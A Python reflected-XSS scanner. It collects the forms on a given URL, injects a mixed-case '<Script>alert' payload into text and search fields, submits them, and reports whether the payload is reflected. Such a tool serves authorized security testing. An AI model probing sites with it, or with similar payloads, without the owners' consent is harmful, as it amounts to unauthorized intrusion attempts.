#!/usr/bin/python

import requests, optparse
from colors import green, red, reset
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


parser = optparse.OptionParser()


## get_forms(url) retrieve every <forms> from a website
def get_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


## get_form_details(form) retrieve every informations from a <form> like the method, the action and the inputs type
def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details


def submit(form_details, url, value):
    ## Url to attack
    target = urljoin(url, form_details["action"])

    inputs = form_details["inputs"]
    data = {}

    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"{green}[+] Sendind the payload to {target} {reset}")
    if data:
        print(f"\033[33mData sent : {data}{reset}")
    if form_details["method"] == "post":
        ## Send a POST request
        return requests.post(target, data=data)
    else:
        ## Send a GET request
        return requests.get(target, params=data)


def scan(url):
    try:
        forms = get_forms(url)

        print(f"{green}[+] Detected {len(forms)} forms on {url}{reset}")
        script = "<Script>alert('hackable')</scripT>"

        is_vulnerable = False

        for form in forms:
            form_details = get_form_details(form)
            content = submit(form_details, url, script).content.decode()
            if script in content:
                print(f"{green}[+] XSS detected on {url}{reset}")
                print(f"\033[33m[+] Form details :")
                pprint(form_details)
                print("{reset}")
                is_vulnerable = True

        if is_vulnerable:
            result = f"{red}\r\nThis Website is vulnerable to XSS.{reset}\r\n"
        else:
            result = f"{red}\r\nThis Website is not vulnerable to XSS.{reset}\r\n"

        return result
    except NameError as e:
        return e


if __name__ == "__main__":
    target = input("\r\nEnter an url : ")

    if target:
        print(scan(target))
    else:
        print("Enter a valid url. Check documentation.")
